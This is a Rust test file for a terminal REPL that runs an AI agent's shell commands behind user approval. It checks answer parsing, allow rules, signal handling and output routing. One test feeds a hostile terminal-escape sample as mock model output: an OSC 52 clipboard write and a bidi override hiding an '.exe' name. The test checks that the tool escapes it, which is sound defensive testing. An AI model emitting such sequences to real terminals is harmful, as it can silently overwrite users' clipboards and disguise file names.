    p.line("always");
    p.expect(" ? [y/N] ", W);
    p.ctrl_d();
    p.expect("(interrupted)\r\n", W);
    let screen = String::from_utf8_lossy(&p.screen()).into_owned();
    assert!(screen.contains(" ? [y/N] \r\n(interrupted)\r\n"), "not on a row of its own:\n{screen:?}");
    let d = ended(p, 0); // the end of input also ends the REPL at its next prompt
    assert_eq!((verdicts(&d), &d.results()[0]["content"]), (vec![], &json!("not run: interrupted")), "{}", d.diag());
    assert!(!r.allow().exists() && !r.path("kept-out.txt").exists() && m.log().len() == 1);
}

/// Answers are trimmed and in any case: `YES` and ` Yes ` run the call and `Always` saves a rule; `a` is a no.
#[test]
fn pty_approval_answer_forms() {
    let m = Mock::start(vec![shell("echo one > one.txt"), shell("echo two > two.txt"), shell("echo three"), shell("touch four.txt"), say("all answered")]);
    let r = asking(&m);
    let root = r.root();
    let p = start(&r, &[]);
    p.line("go");
    for (answer, ran) in [("YES", "$ echo one > one.txt -> exit 0, "), (" Yes ", "$ echo two > two.txt -> exit 0, ")] {
        p.expect("run? [y/N/always] ", W);
        p.line(answer);
        p.expect(ran, W);
    }
    p.expect("run? [y/N/always] ", W);
    p.line("Always");
    p.expect(&format!("save rule for {root}: echo three ? [y/N] "), W);
    p.line("y");
    p.expect(&format!("added to ~/.config/henki/allow as rule 1 for {root}; /allow lists and removes rules\r\n"), W);
    p.expect("run? [y/N/always] ", W);
    p.line("a");
    p.expect("all answered", W);
    p.prompt(W);
    let d = exit(p);
    assert_eq!(verdicts(&d), [json!(["yes", null]), json!(["yes", null]), json!(["always", 1]), json!(["no", null])], "{}", d.diag());
    assert!(r.path("one.txt").exists() && r.path("two.txt").exists() && !r.path("four.txt").exists());
}

/// With the config only in the environment there is no config dir: a confirmed `always` cannot save its rule, says so,
/// and runs the call once; nothing is created, and the next session asks again.
#[test]
fn pty_always_no_config_dir() {
    let mut r = Run::new("");
    let m = Mock::start(vec![shell("echo fresh-dir"), say("ran once")]);
    r.config_text(None).env("HENKI_MODEL", "mock-model").env("HENKI_BASE_URL", &m.url());
    let root = r.root();
    let p = start(&r, &[]);
    p.line("go");
    p.expect("run? [y/N/always] ", W);
    p.line("always");
    p.expect(&format!("save rule for {root}: echo fresh-dir ? [y/N] "), W);
    p.line("y");
    p.expect("henki: could not write ~/.config/henki/allow: No such file or directory (os error 2); ran once\r\n", W);
    p.expect("$ echo fresh-dir -> exit 0, ", W);
    p.expect("ran once", W);
    p.prompt(W);
    let d = exit(p);
    assert_eq!(verdicts(&d), [json!(["yes", null])], "{}", d.diag());
    assert!(!r.config_dir().exists(), "a config dir appeared");
    let m2 = Mock::start(vec![shell("echo fresh-dir"), say("asked")]);
    r.env("HENKI_BASE_URL", &m2.url());
    let p = start(&r, &[]);
    p.line("again");
    p.expect("run? [y/N/always] ", W);
    p.line("n");
    p.expect("asked", W);
    p.prompt(W);
    exit(p);
}

#[test]
fn pty_help_text() {
    let m = Mock::start(vec![]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("/help");
    p.expect(
        "/help\r\n/exit  quit (also Ctrl-D)\r\n/mods [ARGS]  the module manager on this terminal (henki mods ARGS)\r\n\
        /allow [rm N]  list the allow rules, or remove rule N (henki mods allow)\r\n/help  this list\r\n\
        !CMD  run CMD yourself on this terminal; the model is told you ran it\r\n\
        Enter sends the message; a paste goes into it whole (up to 1 MiB, newlines kept) and is never a command.\r\n> ",
        W,
    );
    let d = exit(p);
    assert!(m.log().is_empty() && d.journal.is_none(), "{}", d.diag());
}

/// A line that starts with `/` is a command; one henki does not know is noted and never reaches the model.
#[test]
fn pty_unknown_command_not_sent() {
    let m = Mock::start(vec![]);
    let r = asking(&m);
    let rules = format!("{}\techo kept\n", r.root());
    r.write_allow(&rules);
    let p = start(&r, &[]);
    for cmd in ["/x", "/exit now", "/allowx", "/modsx"] {
        p.line(cmd);
        p.expect(&format!("{cmd}\r\nhenki: unknown command {cmd}; /help lists the commands\r\n"), W);
        p.prompt(W);
    }
    let d = exit(p);
    assert!(m.log().is_empty() && d.journal.is_none(), "{}", d.diag());
    assert_eq!(fs::read_to_string(r.allow()).unwrap(), rules);
}

/// An empty or blank line is no message.
#[test]
fn pty_blank_line_not_sent() {
    let m = Mock::start(vec![say("only this")]);
    let r = asking(&m);
    let p = start(&r, &[]);
    for blank in ["", "   ", "\t "] {
        p.line(blank);
        p.prompt(W);
    }
    message(&p, "a real one", "only this");
    let d = exit(p);
    assert_eq!((m.log().len(), d.of("user").len()), (1, 1), "{}", d.diag());
}

/// The banner names each extension with its commands (or `doc only`) and what they shadow.
#[test]
fn pty_banner_lists_extensions() {
    let m = Mock::start(vec![]);
    let mut r = asking(&m);
    for (name, cmds) in [("docs", &[][..]), ("kit", &["kb", "ka"][..]), ("wrap", &["ls", "cat"][..])] {
        let x = r.config_dir().join("ext").join(name);
        fs::create_dir_all(x.join("bin")).unwrap();
        fs::write(x.join("doc.md"), format!("{name} tools\n")).unwrap();
        for c in cmds {
            fs::write(x.join("bin").join(c), "#!/bin/sh\n").unwrap();
            fs::set_permissions(x.join("bin").join(c), fs::Permissions::from_mode(0o755)).unwrap();
        }
    }
    fs::remove_dir(r.config_dir().join("ext/docs/bin")).unwrap();
    r.set("shadow", "[\"wrap/ls\", \"wrap/cat\"]");
    // The first of each name on the user PATH, as a shell would find it.
    let real = |c: &str| ["/usr/local/bin", "/usr/bin", "/bin"].iter().map(|d| Path::new(d).join(c)).find(|p| p.is_file()).unwrap().display().to_string();
    let p = Pty::spawn(&r, &[], 24, 80);
    p.expect(&format!("config: ~/.config/henki/config.toml\r\next docs: doc only\r\next kit: ka, kb\r\next wrap: cat, ls; shadows {}, {}\r\n", real("cat"), real("ls")), W);
    p.prompt(W);
    exit(p);
}

/// What the model streams reaches the terminal escaped: a clipboard write (OSC 52), a carriage return and a bidi
/// override are shown as text.
#[test]
fn pty_answer_escaped() {
    let m = Mock::start(vec![say("copy\x1b]52;c;ZXZpbA==\x07 this\rover \u{202e}txt.exe")]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("show it");
    p.expect("copy\\x1b]52;c;ZXZpbA==\\x07 this\\x0dover \\u{202e}txt.exe\r\n> ", W);
    exit(p); // the postconditions: no raw escape reached the screen
}

/// stdout carries the streamed answer only: the banner, the prompt, the head line and the call line go to the
/// terminal, so `henki > answers.txt` keeps the answers clean.
#[test]
fn pty_stdout_answers_only() {
    let m = Mock::start(vec![shell("echo via-call"), say("the answer text")]);
    let r = Run::new(&m.url());
    let file = r.dir.join("answers.txt");
    let p = Pty::spawn_to(&r, &[], 24, 80, Some(fs::File::create(&file).unwrap()));
    p.expect(&format!("henki {VERSION} · "), W);
    p.prompt(W);
    p.line("answer me");
    p.expect("$ echo via-call\r\n", W);
    p.expect("$ echo via-call -> exit 0, ", W);
    p.prompt(W);
    let d = exit(p);
    assert_eq!(fs::read_to_string(&file).unwrap(), "the answer text\n");
    assert!(!d.out().contains("the answer text"), "the answer reached the terminal:\n{}", d.out());
}

/// The terminal goes away while a call runs: the turn ends, henki exits 130, and nothing the call started is left.
#[test]
fn pty_hangup_during_call() {
    let mut r = Run::new("");
    let m = Mock::start(vec![shell(&r.sleep()), say("never")]);
    r.at(&m.url());
    let p = start(&r, &[]);
    p.line("wait for it");
    p.expect(&format!("$ {}\r\n", r.sleep()), W);
    assert!(poll(W, || !marked(&r.marker).is_empty()), "the call did not start");
    let d = p.hang_up(W);
    d.finish();
    assert_eq!(d.code, Some(130), "{}", d.diag());
    assert_eq!((d.of("turn_end").len(), m.log().len()), (1, 1), "{}", d.diag());
}

/// A trust file that changes while the question waits (here the extension command the call runs) is found when the user
/// answers: `y` ends the turn `error changed` and the changed command never runs.
#[test]
fn pty_trust_change_during_question_not_run() {
    let m = Mock::start(vec![shell("xtool"), say("never")]);
    let r = asking(&m);
    let x = r.config_dir().join("ext/tools");
    fs::create_dir_all(x.join("bin")).unwrap();
    fs::write(x.join("doc.md"), "runs xtool\n").unwrap();
    let xtool = x.join("bin/xtool");
    fs::write(&xtool, "#!/bin/sh\necho vetted\n").unwrap();
    fs::set_permissions(&xtool, fs::Permissions::from_mode(0o755)).unwrap();
    let says = format!("trust file changed: {}", xtool.display());
    let p = start(&r, &[]);
    p.line("use the tool");
    p.expect("run? [y/N/always] ", W);
    fs::write(&xtool, "#!/bin/sh\necho SWAPPED\n").unwrap();
    p.line("y");
    p.expect(&format!("henki: {says}\r\n"), W);
    p.expect(&format!("(error changed: {says})\r\n"), W);
    p.prompt(W);
    p.line("go on");
    p.expect(REFUSED, W);
    p.prompt(W);
    let d = exit(p);
    assert_eq!(verdicts(&d), [json!(["yes", null])]);
    assert_eq!(d.results()[0]["content"], "not run: trust file changed", "{}", d.diag());
    assert!(!d.out().contains("SWAPPED") && m.log().len() == 1, "{}", d.diag());
}

/// A Ctrl-C at a question leaves the turn going, and SIGINT as the last signal; when a closed stdout later stops the turn,
/// its processes get SIGTERM first, as for any stop that is not the user's cancel.
#[test]
fn pty_ctrl_c_at_question_then_epipe_sigterm_first() {
    let mut r = Run::new("");
    let handlers = r#"$SIG{INT} = sub { open(my $f, ">>", "sigs.txt"); print $f "int\n"; close $f }; $SIG{TERM} = sub { open(my $f, ">>", "sigs.txt"); print $f "term\n"; close $f; exit 0 }; open(my $f, ">", "ready.txt"); close $f; sleep 1 while 1"#;
    let bg = format!("perl -e '{handlers}' {} >/dev/null 2>&1 & for i in $(seq 200); do [ -f ready.txt ] && break; sleep 0.05; done; echo started", r.marker);
    let pause = Step::Stall { before_first_byte: false, after_words: 0, for_ms: 30_000 };
    let words = Step::Stream { parts: vec![say("words for a closed stdout"), pause, say(" never")], finish: Some("stop".into()), done: true, hold_ms: 0 };
    let m = Mock::start(vec![shell("touch first.txt"), shell(&bg), words]);
    r.at(&m.url()).set("approve", "\"ask\"");
    let (rd, wr) = std::io::pipe().unwrap();
    drop(rd);
    let p = Pty::spawn_to(&r, &[], 24, 80, Some(fs::File::from(std::os::fd::OwnedFd::from(wr))));
    p.prompt(W);
    p.line("start it");
    p.expect("run? [y/N/always] ", W);
    p.ctrl_c();
    p.expect("run? [y/N] ", W); // the command is too long for a rule
    p.line("y");
    p.expect("(output closed)\r\n", W);
    let d = p.wait(W);
    m.open_gate();
    d.finish();
    assert_eq!(d.code, Some(141), "{}", d.diag());
    assert!(poll(W, || r.path("sigs.txt").exists()), "the background process got no signal it could see");
    assert_eq!(fs::read_to_string(r.path("sigs.txt")).unwrap(), "term\n", "SIGTERM first, and no SIGINT\n{}", d.diag());
    assert_eq!(d.kinds().iter().filter(|k| *k == "approval").count(), 2, "{}", d.diag());
}

/// A `!cmd &` job is stopped when the REPL ends, and henki says so, also when no message was sent (and so no session
/// file is left).
#[cfg(target_os = "linux")]
#[test]
fn pty_bang_job_stopped_notice_without_message() {
    let m = Mock::start(vec![]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line(&format!("!sleep {} &", r.marker));
    p.prompt(W);
    assert!(poll(W, || !marked(&r.marker).is_empty()), "the job did not start");
    p.line("/exit");
    p.expect("henki: stopped 1 background processes at exit\r\n", W);
    let d = ended(p, 0);
    assert!(d.journal.is_none() && r.journals().is_empty() && marked(&r.marker).is_empty(), "{}", d.diag());
}

/// The voluntary context switches of henki's line reader thread: each one is a time it blocked.
#[cfg(target_os = "linux")]
fn reader_blocks(pid: i32) -> u64 {
    let tasks = fs::read_dir(format!("/proc/{pid}/task")).unwrap();
    let input = tasks.flatten().map(|t| t.path()).find(|t| fs::read_to_string(t.join("comm")).is_ok_and(|c| c == "input\n")).expect("the input thread");
    let status = fs::read_to_string(input.join("status")).unwrap();
    status.lines().find_map(|l| l.strip_prefix("voluntary_ctxt_switches:")).unwrap().trim().parse().unwrap()
}

/// After a Ctrl-C at a question the reader's read for it may still be under way, now with the terminal canonical again:
/// a line typed before the turn ends completes it and is dropped as stale (or, when the read has not started, dropped at
/// the next prompt). It neither answers a later question nor becomes the next message. The next line typed at the
/// prompt is the next message.
#[cfg(target_os = "linux")]
#[test]
fn pty_typeahead_after_ctrl_c_at_question() {
    let pause = Step::Stall { before_first_byte: false, after_words: 0, for_ms: 30_000 };
    let busy = Step::Stream { parts: vec![say("still working"), pause, say(" done")], finish: Some("stop".into()), done: true, hold_ms: 0 };
    let m = Mock::start(vec![shell("touch q.txt"), busy, say("got the later line")]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("go");
    p.expect("run? [y/N/always] ", W);
    p.ctrl_c();
    p.expect("still working", W);
    let before = reader_blocks(p.pid());
    p.line("typed ahead");
    // Read and dropped: the reader blocked again, now waiting to be asked for a line.
    assert!(poll(W, || reader_blocks(p.pid()) > before), "the reader did not take the line");
    m.open_gate();
    p.expect(" done", W);
    p.prompt(W);
    p.line("later");
    p.expect("got the later line", W);
    p.prompt(W);
    let d = exit(p);
    assert!(m.log().iter().all(|l| !l.text().contains("typed ahead")), "the typed-ahead line reached the model\n{}", d.diag());
    assert!(m.log()[2].contents("user").last().unwrap().ends_with("later"), "{:?}", m.log()[2].contents("user"));
    assert!(!r.path("q.txt").exists());
}

/// `yes` confirms a rule as `y` does, in any case.
#[test]
fn pty_always_confirm_yes() {
    let m = Mock::start(vec![shell("echo confirmed"), say("saved it")]);
    let r = asking(&m);
    let root = r.root();
    let p = start(&r, &[]);
    p.line("go");
    p.expect("run? [y/N/always] ", W);
    p.line("always");
    p.expect(" ? [y/N] ", W);
    p.line("YES");
    p.expect(&format!("added to ~/.config/henki/allow as rule 1 for {root}; /allow lists and removes rules\r\n"), W);
    p.expect("saved it", W);
    p.prompt(W);
    let d = exit(p);
    assert_eq!(verdicts(&d), [json!(["always", 1])], "{}", d.diag());
    assert!(fs::read_to_string(r.allow()).unwrap().ends_with(&format!("{root}\techo confirmed\n")));
}

/// An answer that comes without deltas (a server's JSON completion, an Anthropic text block sent whole) is shown all
/// the same, before the next prompt.
#[test]
fn pty_answer_without_deltas_shown() {
    let completion = json!({"id": "cmpl-1", "object": "chat.completion", "model": "mock-model",
        "choices": [{"index": 0, "message": {"role": "assistant", "content": "json-answer-words"}, "finish_reason": "stop"}],
        "usage": {"prompt_tokens": 50, "completion_tokens": 3, "total_tokens": 53}});
    let m = Mock::start(vec![Step::Json(completion)]);
    let r = asking(&m);
    let p = start(&r, &[]);
    p.line("no streaming");
    p.expect("no streaming\r\njson-answer-words\r\n> ", W);
    let d = exit(p);
    assert_eq!(d.of("assistant")[0]["msg"]["content"], "json-answer-words");
    let msg = json!({"id": "msg_whole", "type": "message", "role": "assistant", "content": [], "model": "mock-model", "stop_reason": null, "stop_sequence": null,
        "usage": {"input_tokens": 10, "output_tokens": 1}});
    let events = [
        ("message_start", json!({"type": "message_start", "message": msg})),
        ("content_block_start", json!({"type": "content_block_start", "index": 0, "content_block": {"type": "text", "text": "whole-text-block"}})),
        ("content_block_stop", json!({"type": "content_block_stop", "index": 0})),
        ("message_delta", json!({"type": "message_delta", "delta": {"stop_reason": "end_turn", "stop_sequence": null}, "usage": {"output_tokens": 3}})),
        ("message_stop", json!({"type": "message_stop"})),
    ];
    let m = Mock::start_api(Api::Anthropic, vec![Step::Events(events.into_iter().map(|(n, v)| (n.to_string(), v)).collect())]);
    let mut r = asking(&m);
    r.set("dialect", "\"anthropic\"");
    let p = start(&r, &[]);
    p.line("hi");
    p.expect("hi\r\nwhole-text-block\r\n> ", W);
    let d = exit(p);
    assert_eq!(d.of("assistant")[0]["msg"]["content"], "whole-text-block");
}

/// SIGTERM cancels a busy turn and ends the REPL. A Ctrl-C that comes while the turn's processes are being stopped only
/// hurries the kill: henki still exits 130 instead of going back to the prompt.
#[test]
fn pty_term_then_ctrl_c_while_finishing_130() {
    let mut r = Run::new("");
    let cmd = format!("trap 'echo term >> term.txt' TERM; echo ready > ready.txt; while :; do sleep 0.05; done # {}", r.marker);
    let m = Mock::start(vec![shell(&cmd), say("never")]);
    r.at(&m.url());
    let p = start(&r, &[]);
    p.line("run it");
    assert!(poll(W, || r.path("ready.txt").exists()), "the call did not start");
    p.signal(libc::SIGTERM);
    // The call got henki's SIGTERM and lives on through the grace henki gives it: henki is finishing the turn now.
    assert!(poll(W, || r.path("term.txt").exists()), "the call never got SIGTERM");
    p.signal(libc::SIGINT);
    let d = p.wait(W);
    d.finish();
    assert_eq!(d.code, Some(130), "{}", d.diag());
    assert_eq!(d.of("turn_end")[0]["status"], "interrupted", "{}", d.diag());
}

/// The REPL's own flags take effect: `--nested` (needed inside another henki), `--model` and `--approve auto` in the
/// banner, and `--config` names the file it read.
#[test]
fn pty_flags_take_effect() {
    let m = Mock::start(vec![]);
    let mut r = asking(&m);
    let alt = r.dir.join("alt");
    fs::create_dir_all(alt.join("ext")).unwrap();
    fs::set_permissions(&alt, fs::Permissions::from_mode(0o700)).unwrap();
    let file = alt.join("henki.toml");
    fs::write(&file, format!("model = \"alt-model\"\nbase_url = \"{}\"\napprove = \"ask\"\ncontext_window = 32768\n", m.url())).unwrap();
    fs::set_permissions(&file, fs::Permissions::from_mode(0o600)).unwrap();
    r.env("HENKI_DEPTH", "1");
    let d = Pty::spawn(&r, &[], 24, 80).wait(W);
    d.finish();
    assert_eq!(d.code, Some(2), "{}", d.diag());
    assert!(d.out().contains("refusing to start inside henki (HENKI_DEPTH=1); pass --nested if this is intended"), "{}", d.diag());
    let p = Pty::spawn(&r, &["--nested", "--config", file.to_str().unwrap()], 24, 80);
    p.expect(&format!("henki {VERSION} · alt-model · {} (openai)", m.url()), W);
    p.expect("approval: ask\r\n", W);
    p.expect(&format!("config: {}\r\n", file.display()), W);
    p.prompt(W);
    exit(p);
    let p = Pty::spawn(&r, &["--nested", "--model", "flag-model", "--approve", "auto"], 24, 80);
    p.expect(&format!("henki {VERSION} · flag-model · "), W);
    p.expect("approval: AUTO (from --approve)\r\n", W);
    p.expect("config: ~/.config/henki/config.toml\r\n", W);
    p.prompt(W);
    exit(p);
}
